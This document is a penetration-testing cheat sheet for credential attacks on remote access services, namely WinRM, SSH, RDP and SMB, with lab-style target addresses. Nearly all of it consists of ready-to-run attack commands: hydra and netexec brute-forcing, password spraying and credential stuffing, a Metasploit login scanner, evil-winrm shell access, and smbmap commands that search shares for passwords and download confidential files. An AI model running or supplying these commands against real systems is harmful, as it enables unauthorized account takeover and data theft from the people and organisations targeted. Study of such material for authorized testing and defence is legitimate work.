---
title: Network Services
tags: [password-attacks, winrm, ssh, rdp, smb, hydra, netexec, evil-winrm, spraying, stuffing]
---

# Network Services

> Brute-force and spray credentials across common remote access protocols.

## WinRM — Windows Remote Management

**Ports:** 5985 (HTTP), 5986 (HTTPS)

```bash
# Install NetExec
sudo apt-get -y install netexec

# Brute-force WinRM
netexec winrm 10.129.42.197 -u user.list -p password.list

# Connect once creds are known
evil-winrm -i 10.129.42.197 -u <user> -p <password>
```

!!! tip
    WinRM is the go-to shell once you have creds — it gives a full PowerShell session. Always try it when port 5985/5986 is open.

---

## SSH — Secure Shell

**Port:** 22

```bash
hydra -L user.list -P password.list ssh://10.129.42.197
```

---

## RDP — Remote Desktop Protocol

**Port:** 3389

```bash
# Brute-force
hydra -L user.list -P password.list rdp://10.129.42.197

# Connect from Linux
xfreerdp /v:<target-IP> /u:<username> /p:<password>
```

---

## SMB — Server Message Block

**Ports:** 139, 445

```bash
# Hydra (may fail on SMBv3 — use Metasploit as fallback)
hydra -L user.list -P password.list smb://10.129.42.197

# Metasploit fallback
msfconsole -q
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > set user_file user.list
msf6 auxiliary(scanner/smb/smb_login) > set pass_file password.list
msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.42.197
msf6 auxiliary(scanner/smb/smb_login) > run

# NetExec — view shares once you have creds
netexec smb 10.129.42.197 -u "user" -p "password" --shares

# SMBClient — list and connect to shares
smbclient -L //10.129.17.1 -U <user>
smbclient //10.129.17.1/<Share> -U <user>

# SMBMAP — enumerate shares and permissions
smbmap -H 10.129.17.1 -u <user> -p <password>
smbmap -H 10.129.17.1 -u <user> -p <password> -r <share> --depth 5
smbmap -H 10.129.17.1 -u <user> -p <password> -r <share> -A '(password|config|\.txt|\.docx)'
smbmap -H 10.129.17.1 -u <user> -p <password> --download 'HR/Confidential/file.txt'
```

---

## Spraying, Stuffing, and Defaults

### Password Spraying

Try one password against many accounts — avoids lockouts.

```bash
netexec smb 10.100.38.0/24 -u usernames.list -p 'ChangeMe123!'
```

### Credential Stuffing

Reuse a known username:password pair against a different service.

```bash
hydra -C user_pass.list ssh://10.100.38.23
```

### Default Credentials

```bash
pip3 install defaultcreds-cheat-sheet
creds search linksys
```

!!! warning
    Password spraying is noisy and can trigger lockouts if there is a policy. Check for lockout thresholds before spraying — even 5 attempts per account can lock you out in some environments.
